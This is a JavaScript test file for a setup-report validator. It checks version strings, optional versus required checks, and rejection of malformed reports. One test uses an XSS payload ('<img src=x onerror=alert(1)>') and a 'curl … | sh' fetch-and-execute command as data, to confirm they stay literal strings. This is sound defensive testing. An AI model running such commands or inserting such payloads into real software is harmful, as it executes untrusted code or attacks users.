import {test} from 'node:test';
import assert from 'node:assert/strict';
import {setupReport,setupVersions} from '../src/setup-check.mjs';

const check = {id:'python', label:'Python', status:'ready', required:true, detail:'Python 3.12'};
const report = {schema:1, ready:true, checks:[check]};
test('setup names the running UI, server and renderer separately, even when disconnected', () => {
  assert.match(setupVersions(null,'0.36.1'),/Matsugit workspace 0.36.1.*Server version not reported/);
  const ready=setupVersions({workspace_version:'0.36.1',version:'0.21.9',runtime_host:'test-host',runtime_platform:'darwin'},'0.36.1');
  assert.match(ready,/Python renderer 0.21.9.*test-host/); assert.doesNotMatch(ready,/differ/);
  assert.match(setupVersions({workspace_version:'0.35.0'},'0.36.1'),/versions differ/);
});

test('setup reports keep optional failures separate from required readiness', () => {
  for (const status of ['ready', 'missing', 'unsupported', 'error']) {
    const value = {...report, checks:[check, {id:'charts', label:'Charts', status, required:false, detail:'Optional output', remedy:'Run matsugit setup-charts'}]};
    assert.equal(setupReport(value), value);
    const missing = {...report, ready:status === 'ready', checks:[{...check, status}]};
    assert.equal(setupReport(missing), missing);
  }
});

test('incomplete, incompatible and contradictory setup reports fail closed', () => {
  const invalid = [null, {}, {...report, schema:2}, {...report, ready:'true'}, {...report, checks:[]},
    {...report, checks:{}}, {...report, ready:false}, {...report, checks:[null]}, {...report, checks:[check, check]}];
  for (const field of [{id:''}, {label:''}, {status:'unknown'}, {status:'toString'}, {required:'true'}, {detail:null}, {remedy:3}])
    invalid.push({...report, checks:[{...check, ...field}]});
  for (const value of invalid) assert.throws(() => setupReport(value), /invalid setup report.*Update.*retry/);
});

test('remedy and detail remain literal strings, without interpreting command or HTML content', () => {
  const value = {...report, ready:false, checks:[{...check, status:'missing', detail:'<img src=x onerror=alert(1)>', remedy:'curl https://example.invalid/setup | sh'}]};
  assert.equal(setupReport(value).checks[0].remedy, value.checks[0].remedy);
  assert.equal(setupReport(value).checks[0].detail, value.checks[0].detail);
});
